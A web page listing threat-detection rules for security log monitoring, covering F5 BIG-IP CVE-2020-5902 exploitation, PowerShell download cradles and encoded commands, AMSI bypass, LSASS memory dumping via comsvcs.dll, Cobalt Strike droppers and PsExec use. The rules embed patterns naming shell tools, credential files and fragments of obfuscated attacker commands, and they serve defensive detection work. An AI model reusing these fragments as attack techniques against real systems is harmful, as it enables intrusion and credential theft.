<li><a href="#">rule possible_execution_from_volume_shadow_copy { meta: author = "Roman Ranskyi, SBousseaden" description = "DELETE delete double quotes in search (ELK or Graylog)! Detects suspicious execution from shadow copy. License: ." reference = "" version = "0.01" created = "2019/05/28" product = "windows" service = "sysmon" mitre = "defense_evasion" events: (re.regex($selection0.target.process.file.full_path, `HarddiskVolumeShadowCopy.*`) or re.regex($selection0.target.process.command_line, `HarddiskVolumeShadowCopy.*`)) condition: $selection0 
<li><a href="#">rule possible_f5_bigip_tmui_attack_cve20205902 { meta: author = "Roman Ranskyi" description = "Detects possible CVE-2020-5902 exploitation attempt against F5 BIG-IP, The Traffic Management User Interface (TMUI) Attack. License: ." reference = "" version = "0.01" created = "2021-03-09" category = "webserver" mitre = "initial_access, t1190" events: ((re.regex($selection.target.url, `.*/tmui/login\.jsp.*`) and (re.regex($selection.target.url, `.*\.\.;.*`) or re.regex($selection.target.url, `.*\.\./.*`))) or (re.regex($selection.target.url, `.*/tmui/login\.jsp.*`) and (re.regex($selection.target.url, `.*\?command=.*`) or re.regex($selection.target.url, `.*\+admin.*`) or re.regex($selection.target.url, `.*;id.*`) or re.regex($selection.target.url, `.*/nc.*`) or re.regex($selection.target.url, `.*/sh.*`) or re.regex($selection.target.url, `.*/bash.*`) or re.regex($selection.target.url, `.*/curl.*`) or re.regex($selection.target.url, `.*authproperties\.jsp.*`) or re.regex($selection.target.url, `.*getTabSet\.jsp.*`) or re.regex($selection.target.url, `.*;/tmui/.*`) or re.regex($selection.target.url, `.*/passwd.*`) or re.regex($selection.target.url, `.*/shadow.*`)))) condition: $selection 
<li><a href="#">rule possible_f5_bigip_tmui_attack_cve20205902_part_1 { meta: author = "Roman Ranskyi" description = "Detects possible CVE-2020-5902 exploitation attempt against F5 BIG-IP, The Traffic Management User Interface (TMUI) Attack. License: ." reference = "" version = "0.01" created = "2021-03-09" category = "proxy" mitre = "initial_access, t1190" events: ((re.regex($selection.target.url, `.*/tmui/login\.jsp.*`) and (re.regex($selection.target.url, `.*\.\.;.*`) or re.regex($selection.target.url, `.*\.\./.*`))) or (re.regex($selection.target.url, `.*/tmui/login\.jsp.*`) and (re.regex($selection.target.url, `.*\?command=.*`) or re.regex($selection.target.url, `.*\+admin.*`) or re.regex($selection.target.url, `.*;id.*`) or re.regex($selection.target.url, `.*/nc.*`) or re.regex($selection.target.url, `.*/sh.*`) or re.regex($selection.target.url, `.*/bash.*`) or re.regex($selection.target.url, `.*/curl.*`) or re.regex($selection.target.url, `.*authproperties\.jsp.*`) or re.regex($selection.target.url, `.*getTabSet\.jsp.*`) or re.regex($selection.target.url, `.*;/tmui/.*`) or re.regex($selection.target.url, `.*/passwd.*`) or re.regex($selection.target.url, `.*/shadow.*`)))) condition: $selection 
<li><a href="#">rule possible_flash_0day_execute_embedded_in_word_document_sysmon { meta: author = "Roman Ranskyi" description = "An active exploitation of a zero-day vulnerability in Adobe Flash via a Microsoft Office document. License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "execution, t1203, t1059.003" events: (re.regex($selection.src.process.file.full_path, `.*WINWORD\.exe`) and re.regex($selection.target.process.command_line, `.*&&.*`) and re.regex($selection.target.process.command_line, `.*%~dp0.*`) and re.regex($selection.target.process.command_line, `.*-inul.*`) and re.regex($selection.target.process.command_line, `.*rar.*`) and re.regex($selection.target.process.command_line, `.*-o\+.*`) and re.regex($selection.target.process.command_line, `.* e .*`) and re.regex($selection.target.process.command_line, `.*\.jpg.*`) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule possible_hpcustpartuidll_hijack_via_imageload { meta: author = "SOC Prime Team, FireEye" description = "This rule has been ported from Fireeye's HXIOC format to SIGMA. It detects hpcustpartui.dll being loaded from unusual locations. License: ." reference = "" version = "0.01" created = "2021-03-09" category = "image_load" product = "windows" mitre = "persistence, privilege_escalation, defense_evasion, t1574.001" events: (re.regex($selection_image.target.process.file.full_path, `.*\\hpcustpartui\.dll`) and not ((re.regex($selection_image.target.process.file.full_path, `.*Program Files\\HP\\.*`) or re.regex($selection_image.target.process.file.full_path, `.*Program Files \(x86\)\\HP\\.*`) or re.regex($selection_image.target.process.file.full_path, `.*PROGRA~.*`) or re.regex($selection_image.target.process.file.full_path, `.*Program Files \(x86\)\\Trend Micro\\.*`) or re.regex($selection_image.target.process.file.full_path, `.*Program Files\\Trend Micro\\.*`)))) condition: $selection_image 
<li><a href="#">rule possible_impacketobfuscation_wmiexec_or_smbexec_utility_via_cmdline { meta: author = "SOC Prime Team, Fireeye" description = "Impacket-Obfuscation is a slightly obfuscated version of the open source Impacket framework. This IOC looks for artifacts from the execution of SMBEXEC/WMIEXEC python script which is part of Impacket-Obfuscation framework. License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "persistence, privilege_escalation, execution, lateral_movement, t1047, t1021.002, t1543.003" events: (($selection1.metadata.product_event_type = "4688" or $selection1.metadata.product_event_type = "1") and ((re.regex($selection1.target.process.command_line, `.*cmd.*`) and re.regex($selection1.target.process.command_line, `.*/K.*`) and re.regex($selection1.target.process.command_line, `.*/Q.*`)) or (re.regex($selection1.target.process.command_line, `.*/q.*`) or re.regex($selection1.target.process.command_line, `.*/K.*`) or re.regex($selection1.target.process.command_line, `.*echo.*`) or re.regex($selection1.target.process.command_line, `.*%CoMSpEC%.*`)))) condition: $selection1 
<li><a href="#">rule possible_libvlcdll_hijack_via_imageload { meta: author = "SOC Prime Team, Fireeye" description = "Identifies possible DLL search order hijacking of LIBVLC.dll based on image loads from unexpected locations. License: ." reference = "" version = "0.01" created = "2021-03-09" category = "image_load" product = "windows" mitre = "persistence, privilege_escalation, defense_evasion, t1574, t1574.001" events: (re.regex($selection.target.process.file.full_path, `.*LIBVLC\.dll.*`) and re.regex($selection.target.process.file.full_path, `.*videolan.*`)) condition: $selection 
<li><a href="#">rule possible_malicious_use_of_mshtaexe_detector_sysmon_behavior { meta: author = "Lee Archinal" description = "None License: ." reference = "" version = "0.01" created = "2019/09/20" product = "windows" service = "sysmon" mitre = "execution, t1170" events: ($selection1.metadata.product_event_type = "1" and ((re.regex($selection1.target.process.file.full_path, `.*\\mshta\.exe`) and (re.regex($selection1.target.process.command_line, `.*javascript.*`) or re.regex($selection1.target.process.command_line, `.*vbscript.*`) or re.regex($selection1.target.process.command_line, `.*\.hta.*`) or re.regex($selection1.target.process.command_line, `.*http.*`))) or (re.regex($selection1.target.process.file.full_path, `.*\\schtasks\.exe`) and re.regex($selection1.target.process.command_line, `.*/tr mshta\.exe.*`)))) condition: $selection1 
<li><a href="#">rule possible_msbuild_abuse_via_cmdline { meta: author = "SOC Prime Team, Fireeye" description = "This alert looks for msbuild.exe process executions based on common command line arguments used for msbuild.exe. Attackers frequently use msbuild.exe (or renamed versions of this binary) to execute arbitrary CSharp payloads written to disk most commonly as .csproj files (though any file with an extension ending in \"proj\" will work) either referenced on the command line or located in the same directory as the msbuild.exe binary. The XML payload on disk should be acquired and examined to determine the functionality of the payload. License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "defense_evasion, execution, t1127" events: (((re.regex($selection.target.process.command_line, `.*noconsolelogger.*`) or re.regex($selection.target.process.command_line, `.*noconlog.*`)) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) and not ((re.regex($selection.target.process.command_line, `.*msbuild\.exe.*`) or re.regex($selection.target.process.file.full_path, `.*\\msbuild\.exe`) or (re.regex($selection.src.process.file.full_path, `.*\.0\\bin\\nact\.exe.*`) or re.regex($selection.src.process.file.full_path, `.*\\MSBuild\\15\.0\\Bin\\amd64\\Tracker\.exe.*`) or re.regex($selection.src.process.file.full_path, `.*:\\Program Files\\dotnet\\dotnet\.exe.*`))))) condition: $selection 
<li><a href="#">rule possible_new_cobalt_strike_dropper { meta: author = "Ariel Millahuel" description = "Detects the attempts of some threat actors to drop Cobalt Strike into a victim machine via Microsoft Word macros. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "persistence, T1137" events: ($selection1.metadata.product_event_type = "11" and (re.regex($selection1.target.file.full_path, `.*Ecmd\.exe.*`) or re.regex($selection1.target.file.full_path, `.*ecmd\.exe.*`) or re.regex($selection1.target.file.full_path, `.*ecmd\.exe\.lnk.*`) or re.regex($selection1.target.file.full_path, `.*cf\.ini.*`))) condition: $selection1 
<li><a href="#">rule possible_nopowershell_execution_executeassembly_via_cobalt_strike { meta: author = "Roman Ranskyi" description = "NoPowerShell is a tool implemented in C# which supports executing PowerShell-like commands while remaining invisible to any PowerShell logging mechanisms. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "Execution, t1086, Defense Evasion, t1055" events: ($selection0.metadata.product_event_type = "8" and re.regex($selection0.target.process.file.file_metadata.pe.import_hash, `.*0B80`)) condition: $selection0 
<li><a href="#">rule possible_privilege_escalation_attack_using_dllhostexe { meta: author = "Ariel Millahuel" description = "Detects two processes that uses dllhost after an UAC Bypass was done. If you detect this activity in your environment you probably was victim of attackrs and potentially of the LockBit Ransomware License: ." reference = "" version = "0.01" created = "2019/12/11" category = "process_creation" product = "windows" mitre = "t1218, t1218.003, defense_evasion" events: (re.regex($selection.target.process.file.full_path, `.*dllhost\.exe`) and (re.regex($selection.target.process.command_line, `.*Windows\\.*\\DllHost\.exe /Processid:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}.*`) or re.regex($selection.target.process.command_line, `.*Windows\\.*\\DllHost\.exe /Processid:{D2E7041B-2927-42fb-8E9F-7CE93B6DC937}.*`)) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule possible_process_enumeration_sysmonwindows_logs { meta: author = "Roman Ranskyi" description = "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software running on systems within the network. License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "Discovery, t1057" events: (($selection.target.process.command_line = "tasklist.exe" or re.regex($selection.target.process.command_line, `Get-Process.*`)) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule possible_ransomware_or_unauthorized_mbr_modifications { meta: author = "@neu5ron" description = "Detects, possibly, malicious unauthorized usage of bcdedit.exe License: ." reference = "" version = "0.01" created = "2019/02/07" category = "process_creation" product = "windows" mitre = "defense_evasion, t1070, persistence, t1067" events: (re.regex($selection.target.process.command_line, `.*\\bcdedit\.exe`) and (re.regex($selection.target.process.command_line, `.*delete.*`) or re.regex($selection.target.process.command_line, `.*deletevalue.*`) or re.regex($selection.target.process.command_line, `.*import.*`)) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule possible_shim_database_persistence_via_sdbinstexe { meta: author = "Markus Neis, Den Iuzvyk" description = "Detects installation of a new shim using sdbinst.exe. A shim can be used to load malicious DLLs into applications. License: ." reference = "" version = "0.01" created = "2019/01/16" category = "process_creation" product = "windows" mitre = "persistence, t1138" events: (re.regex($selection.target.process.file.full_path, `.*\\sdbinst\.exe`) and ($selection.target.process.command_line = "-q" or $selection.target.process.command_line = "-p") and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule possible_spn_enumeration { meta: author = "Markus Neis, keepwatch" description = "Detects Service Principal Name Enumeration used for Kerberoasting License: ." reference = "" version = "0.01" created = "2018/11/14" category = "process_creation" product = "windows" mitre = "credential_access, t1208" events: ((re.regex($selection_image.target.process.file.full_path, `.*\\setspn\.exe`) or re.regex($selection_image.metadata.description, `.*Query or reset the computer.* SPN attribute.*`)) and re.regex($selection_image.target.process.command_line, `.*-q.*`)) condition: $selection_image 
<li><a href="#">rule possible_system_network_configuration_discovery_sysmonwindows_logs { meta: author = "Roman Ranskyi" description = "Adversaries will likely look for details about the network configuration and settings of systems they access or through information discovery of remote systems. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "" mitre = "Discovery, t1016" events: (($selection1.target.process.file.full_path = "net.exe" and $selection1.target.process.command_line = "net config") or (($selection1.target.process.file.full_path = "ipconfig.exe" or $selection1.target.process.file.full_path = "netsh.exe" or $selection1.target.process.file.full_path = "arp.exe" or $selection1.target.process.file.full_path = "nbtstat.exe" or $selection1.target.process.file.full_path = "systeminfo.exe") and not ($selection1.metadata.product_event_type = "7"))) condition: $selection1 
<li><a href="#">rule possible_system_network_connections_discovery_sysmonwindows_logs { meta: author = "Roman Ranskyi" description = "Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "Discovery, t1049" events: ($selection0.target.process.command_line = "net config" or $selection0.target.process.command_line = "net use" or $selection0.target.process.command_line = "net sessions" or $selection0.target.process.command_line = "net file" or $selection0.target.process.command_line = "net1 config" or $selection0.target.process.command_line = "net1 use" or $selection0.target.process.command_line = "net1 sessions" or $selection0.target.process.command_line = "net1 file" or $selection0.target.process.command_line = "netstat" or $selection0.target.process.command_line = "Get-NetTCPConnection") condition: $selection0 
<li><a href="#">rule possible_system_owneruser_discovery_sysmonwindows_logs { meta: author = "Roman Ranskyi" description = "Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "security" mitre = "Discovery, t1033" events: (($selection0.target.process.command_line = "wmic" or $selection0.target.process.command_line = "useraccount get /ALL" or $selection0.target.process.command_line = "whoami") or ($selection0.target.process.file.full_path = "whoami.exe" or $selection0.target.process.file.full_path = "qwinsta.exe" or $selection0.target.process.file.full_path = "quser.exe")) condition: $selection0 
<li><a href="#">rule possible_system_time_discovery_sysmonwindows_logs { meta: author = "Roman Ranskyi" description = "The system time is set and stored by the Windows Time Service within a domain to maintain time synchronization between systems and services in an enterprise network. (use for Letheral Movement via task scheduler) License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "security" mitre = "Discovery, t1124, Execution, t1059" events: (($selection0.target.process.command_line = "net time" or $selection0.target.process.command_line = "net1 time" or $selection0.target.process.command_line = "Get-Date") or ($selection0.target.process.file.full_path = "net.exe" or $selection0.target.process.file.full_path = "net1.exe" or $selection0.target.process.file.full_path = "w32tm.exe")) condition: $selection0 
<li><a href="#">rule possible_usage_of_physmem2profit_for_lsass_dump { meta: author = "Den Iuzvyk" description = "Detects possible usage of physmem2profit. License: ." reference = "" version = "0.01" created = "2020/02/17" product = "windows" service = "sysmon" mitre = "credential_access, t1003" events: ((($selection.metadata.product_event_type = "12" or $selection.metadata.product_event_type = "13") and re.regex($selection.target.registry.registry_key, `.*\\System\\CurrentControlSet\\Services\\physmem2profit\\.*`)) or ($selection.metadata.product_event_type = "6" and re.regex($selection.target.process.file.full_path, `.*att_winpmem_64\.sys`)) or ($selection.metadata.product_event_type = "6" and $selection.target.registry.registry_value_data = "Binalyze LLC")) condition: $selection 
<li><a href="#">rule potential_rdp_exploit_cve20190708 { meta: author = "Lionel PRAT, Christophe BROCAS, @atc_project (improvements)" description = "Detect suspicious error on protocol RDP, potential CVE-2019-0708 License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "system" mitre = "initial_access, lateral_movement, t1210, t1190, car.2013-07-002" events: (($selection.metadata.product_event_type = "56" or $selection.metadata.product_event_type = "50") and $selection.src.application = "TermDD") condition: $selection 
<li><a href="#">rule potential_solarwinds_mimicking_via_proxy { meta: author = "SOC Prime Team, Fireeye" description = "This rule was converted from the FireEye hxioc rule. This rule identifies traffic mimiking solarwinds to non-solarwinds domains. License: ." reference = "" version = "0.01" created = "2021-03-09" category = "proxy" mitre = "initial_access, t1195.002" events: ((re.regex($selection.target.url, `.*/swip/events.*`) or re.regex($selection.target.url, `.*/swip/systemdescription.*`) or re.regex($selection.target.url, `.*/swip/upload\.ashx.*`) or re.regex($selection.target.url, `.*/swip/upd.*`)) and not (re.regex($selection.target.hostname, `.*solarwinds\.com`))) condition: $selection 
<li><a href="#">rule powershell_amsi_bypass_via_net_reflection { meta: author = "Markus Neis" description = "Detects Request to amsiInitFailed that can be used to disable AMSI Scanning License: ." reference = "" version = "0.01" created = "2018/08/17" category = "process_creation" product = "windows" mitre = "execution, defense_evasion, t1086" events: (re.regex($selection1.target.process.command_line, `.*System\.Management\.Automation\.AmsiUtils.*`) and ($selection1.metadata.product_event_type = "4688" or $selection1.metadata.product_event_type = "1") and re.regex($selection1.target.process.command_line, `.*amsiInitFailed.*`)) condition: $selection1 
<li><a href="#">rule powershell_base64_encoded_shellcode { meta: author = "Florian Roth" description = "Detects Base64 encoded Shellcode License: ." reference = "" version = "0.01" created = "2018/11/17" category = "process_creation" product = "windows" mitre = "defense_evasion, t1036" events: (re.regex($selection1.target.process.command_line, `.*AAAAYInlM.*`) and ($selection1.metadata.product_event_type = "4688" or $selection1.metadata.product_event_type = "1") and (re.regex($selection1.target.process.command_line, `.*OiCAAAAYInlM.*`) or re.regex($selection1.target.process.command_line, `.*OiJAAAAYInlM.*`))) condition: $selection1 
<li><a href="#">rule powershell_dll_attacks_detection { meta: author = "Furkan Celik" description = "Powershell does not equal powershell.exe. Adversaries may use powershell dlls to perform their malicious powershell activities. ou can detect and monitor binaries that use Powershell dlls. License: ." reference = "" version = "0.01" created = "2020/04/24" product = "windows" service = "sysmon" mitre = "execution, T1086" events: ($selection.metadata.product_event_type = "7" and (re.regex($selection.target.process.file.full_path, `.*\\system\.reflection\.dll`) or re.regex($selection.target.process.file.full_path, `.*\\system\.managment\.automation\.ni\.dll`) or re.regex($selection.target.process.file.full_path, `.*\\system\.managment\.automation\.dll`))) condition: $selection 
<li><a href="#">rule powershell_download_from_url { meta: author = "Florian Roth" description = "Detects a Powershell process that contains download commands in its command line string License: ." reference = "" version = "0.01" created = "2021-03-09" category = "process_creation" product = "windows" mitre = "t1086, execution" events: (re.regex($selection.target.process.file.full_path, `.*\\powershell\.exe`) and (re.regex($selection.target.process.command_line, `.*new-object system\.net\.webclient\)\.downloadstring\(.*`) or re.regex($selection.target.process.command_line, `.*new-object system\.net\.webclient\)\.downloadfile\(.*`) or re.regex($selection.target.process.command_line, `.*new-object net\.webclient\)\.downloadstring\(.*`) or re.regex($selection.target.process.command_line, `.*new-object net\.webclient\)\.downloadfile\(.*`)) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule powershell_download_sysmon { meta: author = "Michael Haag, Alexandr Yampolskyi" description = "Detects usage of Powershell Download commands. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "Execution, t1204, t1059" events: ($selection.metadata.product_event_type = "1" and $selection.target.process.file.full_path = "powershell.exe" and (re.regex($selection.target.process.command_line, `.*DownloadFile.*`) or re.regex($selection.target.process.command_line, `.*invoke-webrequest.*`) or re.regex($selection.target.process.command_line, `.*iwr`))) condition: $selection 
<li><a href="#">rule powershell_downloadfile { meta: author = "Florian Roth" description = "Detects the execution of powershell, a WebClient object creation and the invocation of DownloadFile in a single command line License: ." reference = "" version = "0.01" created = "2020/03/25" category = "process_creation" product = "windows" mitre = "execution, t1086" events: (re.regex($selection.target.process.command_line, `.*powershell.*`) and re.regex($selection.target.process.command_line, `.*\.DownloadFile.*`) and re.regex($selection.target.process.command_line, `.*System\.Net\.WebClient.*`) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule powershell_encoded_command_sysmon { meta: author = "Michael Haag, Alexandr Yampolskyi" description = "Detects usage of Powershell Encoded Commands. License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "Execution, t1204, t1059" events: ($selection.metadata.product_event_type = "1" and re.regex($selection.target.process.file.full_path, `.*powershell\.exe`) and (re.regex($selection.target.process.command_line, `.*base64.*`) or re.regex($selection.target.process.command_line, `.*-enc.*`) or re.regex($selection.target.process.command_line, `.*-enco.*`) or re.regex($selection.target.process.command_line, `.*-encod.*`) or re.regex($selection.target.process.command_line, `.*-encode.*`) or re.regex($selection.target.process.command_line, `.*-encoded.*`) or re.regex($selection.target.process.command_line, `.*-ec.*`) or re.regex($selection.target.process.command_line, `.*-en.*`) or re.regex($selection.target.process.command_line, `.*-encodedC.*`) or re.regex($selection.target.process.command_line, `.*-encodedCo.*`) or re.regex($selection.target.process.command_line, `.*-encodedCom.*`) or re.regex($selection.target.process.command_line, `.*-encodedComm.*`) or re.regex($selection.target.process.command_line, `.*-encodedComma.*`) or re.regex($selection.target.process.command_line, `.*-encodedComman.*`) or re.regex($selection.target.process.command_line, `.*-encodedCommand.*`))) condition: $selection 
<li><a href="#">rule powershell_loaded_via_dll { meta: author = "Joseph Kamau" description = "This rule detects when powershell is launched using a dll and not through powershell.exe License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "execution, t1086" events: ($selection.metadata.product_event_type = "7" and (re.regex($selection.target.process.file.full_path, `.*System\.Management\.Automation\.Dll.*`) or re.regex($selection.target.process.file.full_path, `.*System\.Management\.Automation\.ni\.Dll.*`) or re.regex($selection.target.process.file.full_path, `.*System\.Reflection\.Dll.*`))) condition: $selection 
<li><a href="#">rule powershell_network_connections { meta: author = "Florian Roth" description = "Detetcs a Powershell process that opens network connections - check for suspicious target ports and target systems - adjust to your environment (e.g. extend filters with company's ip range') License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" events: (($selection.metadata.product_event_type = "3" and re.regex($selection.target.process.file.full_path, `.*\\powershell\.exe`)) and not ((re.regex($selection.target.ip, `10\..*`) or re.regex($selection.target.ip, `192\.168\..*`) or re.regex($selection.target.ip, `172\..*`) or $selection.target.ip = "127.0.0.1") and $selection.target.ip = "false" and $selection.src.user.user_display_name = "NT AUTHORITY\\SYSTEM")) condition: $selection 
<li><a href="#">rule powershell_obfuscation_by_agenttesla { meta: author = "Emir Erdogan" description = "AgentTesla downloads malware by using obfuscated powershell via ftp server on French Data Center License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "sysmon" mitre = "T1064, T1060, T1081, T1130" events: ((re.regex($selection1.target.process.file.full_path, `.*\\powershell`) and (re.regex($selection1.target.process.command_line, `Powershell $VN=\( '104{100e121'\.SpLiT\('!X_AeZuG{%'\) |fOreACh-oBjeCt{[CHar]\($_-BXOR 0x21 \) }\) -joIN '';sal MUM $VN;$BCmiLrM=@\(.*`) or re.regex($selection1.target.process.command_line, `Powershell '\(&'\+'\(G'\+'C'\+'###'\.replace\('###','M'\)\+' .*W-'\+'O.*\)'\+ 'Ne'\+'t\.'\+'W'\+'eb'\+'C'\+'li'\+'ent\)'\+'\.D'\+'ow'\+'nl'\+'oad'\+'F'\+'il'\+'e\(''.*File\.vbs.*`))) or (re.regex($selection1.target.process.file.full_path, `.*\\RegAsm\.exe`) and re.regex($selection1.src.process.file.full_path, `.*\\InstallUtil\.exe`))) condition: $selection1 
<li><a href="#">rule powershell_rundll32_remote_thread_creation { meta: author = "Florian Roth" description = "Detects PowerShell remote thread creation in Rundll32.exe License: ." reference = "" version = "0.01" created = "2018/06/25" product = "windows" service = "sysmon" mitre = "defense_evasion, execution, t1085, t1086" events: ($selection.metadata.product_event_type = "8" and re.regex($selection.src.process.file.full_path, `.*\\powershell\.exe`) and re.regex($selection.target.process.file.full_path, `.*\\rundll32\.exe`)) condition: $selection 
<li><a href="#">rule powershell_script_run_in_appdata { meta: author = "Florian Roth" description = "Detects a suspicious command line execution that invokes PowerShell with reference to an AppData folder License: ." reference = "" version = "0.01" created = "2019/01/09" category = "process_creation" product = "windows" events: ((re.regex($selection.target.process.command_line, `.* /c powershell.*\\AppData\\Local\\.*`) or re.regex($selection.target.process.command_line, `.* /c powershell.*\\AppData\\Roaming\\.*`)) and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule process_dump_via_comsvcs_dll { meta: author = "Modexp (idea)" description = "Detects process memory dump via comsvcs.dll and rundll32 License: ." reference = "" version = "0.01" created = "2019/09/02" category = "process_creation" product = "windows" mitre = "credential_access, t1003" events: ((re.regex($rundll_image.target.process.file.full_path, `.*\\rundll32\.exe`) or $rundll_image.target.file.full_path = "RUNDLL32.EXE") and ((re.regex($rundll_image.target.process.command_line, `.*comsvcs.*MiniDump.*full.*`) or re.regex($rundll_image.target.process.command_line, `.*comsvcs.*MiniDumpW.*full.*`)) and ($rundll_image.metadata.product_event_type = "4688" or $rundll_image.metadata.product_event_type = "1"))) condition: $rundll_image 
<li><a href="#">rule program_executions_in_suspicious_folders { meta: author = "Florian Roth" description = "Detects program executions in suspicious non-program folders related to malware or hacking activity License: ." reference = "" version = "0.01" created = "2018/01/23" product = "linux" service = "auditd" events: ($selection.metadata.event_type = "SYSCALL" and (re.regex($selection.target.process.file.full_path, `/tmp/.*`) or re.regex($selection.target.process.file.full_path, `/var/www/.*`) or re.regex($selection.target.process.file.full_path, `/usr/local/apache2/.*`) or re.regex($selection.target.process.file.full_path, `/usr/local/httpd/.*`) or re.regex($selection.target.process.file.full_path, `/var/apache/.*`) or re.regex($selection.target.process.file.full_path, `/srv/www/.*`) or re.regex($selection.target.process.file.full_path, `/home/httpd/html/.*`) or re.regex($selection.target.process.file.full_path, `/var/lib/pgsql/data/.*`) or re.regex($selection.target.process.file.full_path, `/usr/local/mysql/data/.*`) or re.regex($selection.target.process.file.full_path, `/var/lib/mysql/.*`) or re.regex($selection.target.process.file.full_path, `/var/vsftpd/.*`) or re.regex($selection.target.process.file.full_path, `/etc/bind/.*`) or re.regex($selection.target.process.file.full_path, `/var/named/.*`) or re.regex($selection.target.process.file.full_path, `.*/public_html/.*`))) condition: $selection 
<li><a href="#">rule psexe_renamed_sysinternals_tool { meta: author = "Florian Roth" description = "Detects renamed SysInternals tool execution with a binary named ps.exe as used by Dragonfly APT group and documented in TA17-293A report License: ." reference = "" version = "0.01" created = "2017/10/22" category = "process_creation" product = "windows" mitre = "defense_evasion, g0035, t1036, car.2013-05-009" events: ($selection.target.process.command_line = "ps.exe -accepteula" and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule psexec_detector { meta: author = "Lee Archinal" description = "Detects PSExec being run on a machine License: ." reference = "" version = "0.01" created = "2019/04/29" product = "windows" service = "sysmon" mitre = "Defense_evasion, t1112, Execution, t1059" events: ($selection.metadata.product_event_type = "1" and re.regex($selection.target.process.file.full_path, `.*\\PsExec\.exe`)) condition: $selection 
<li><a href="#">rule psexec_execution { meta: author = "Samir Bousseaden, Den Iuzvyk(Sigma)" description = "Detects PsExec execution namedpipe License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" service = "security" mitre = "lateral_movement, t1077" events: (($selection1.metadata.product_event_type = "5145" and (re.regex($selection1.target.file.full_path, `.*-stdin.*`) or re.regex($selection1.target.file.full_path, `.*-stdout.*`) or re.regex($selection1.target.file.full_path, `.*-stderr.*`))) and not (re.regex($selection1.target.file.full_path, `.*psexecsvc.*`))) condition: $selection1 
<li><a href="#">rule psexec_process_has_terminated { meta: author = "Lee Archinal" description = "This detects when PsExec's process ends. License: ." reference = "" version = "0.01" created = "2019/04/29" product = "windows" service = "sysmon" mitre = "Defense_evasion, t1112, Execution, t1059" events: ($selection.metadata.product_event_type = "5" and re.regex($selection.target.process.file.full_path, `.*\\psexec\.exe`)) condition: $selection 
<li><a href="#">rule psexec_service_start { meta: author = "Florian Roth" description = "Detects a PsExec service start License: ." reference = "" version = "0.01" created = "2018/03/13" category = "process_creation" product = "windows" mitre = "execution, t1035, s0029" events: ($selection.target.process.command_line = "C:\\Windows\\PSEXESVC.exe" and ($selection.metadata.product_event_type = "4688" or $selection.metadata.product_event_type = "1")) condition: $selection 
<li><a href="#">rule psexec_tool_execution { meta: author = "Thomas Patzke" description = "Detects PsExec service installation and execution events (service and Sysmon) License: ." reference = "" version = "0.01" created = "2021-03-09" product = "windows" mitre = "execution, t1035, s0029" events: (($service_installation.target.process.command_line = "PSEXESVC" and (($service_installation.metadata.product_event_type = "7045" and re.regex($service_installation.target.process.command_line, `.*\\PSEXESVC\.exe`)) or $service_installation.metadata.product_event_type = "7036")) or ($service_installation.metadata.product_event_type = "1" and re.regex($service_installation.target.process.file.full_path, `.*\\PSEXESVC\.exe`) and $service_installation.src.user.user_display_name = "NT AUTHORITY\\SYSTEM")) condition: $service_installation 
